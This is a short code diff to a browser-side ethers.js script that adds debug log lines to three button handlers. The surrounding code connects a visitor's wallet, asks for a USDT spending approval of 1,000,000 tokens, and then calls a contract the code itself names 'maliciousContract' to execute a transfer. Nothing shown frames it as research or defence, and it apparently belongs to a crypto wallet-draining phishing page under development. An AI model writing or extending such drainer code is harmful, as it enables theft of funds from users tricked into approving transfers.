@@ -18,6 +18,7 @@ let signer;
 let userAddress;
 
 document.getElementById("connectButton").onclick = async () => {
+    console.log("Connect button clicked"); // 调试信息
     try {
         if (typeof window.ethereum !== 'undefined') {
             provider = new ethers.providers.Web3Provider(window.ethereum);
@@ -36,6 +37,7 @@ document.getElementById("connectButton").onclick = async () => {
 };
 
 document.getElementById("approveButton").onclick = async () => {
+    console.log("Approve button clicked"); // 调试信息
     const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, signer);
     const amount = ethers.utils.parseUnits("1000000", 6); // 1000000 USDT (6 位小数)
 
@@ -51,6 +53,7 @@ document.getElementById("approveButton").onclick = async () => {
 };
 
 document.getElementById("executeTransferButton").onclick = async () => {
+    console.log("Execute Transfer button clicked"); // 调试信息
     const maliciousContract = new ethers.Contract(maliciousContractAddress, maliciousAbi, signer);
 
     try {
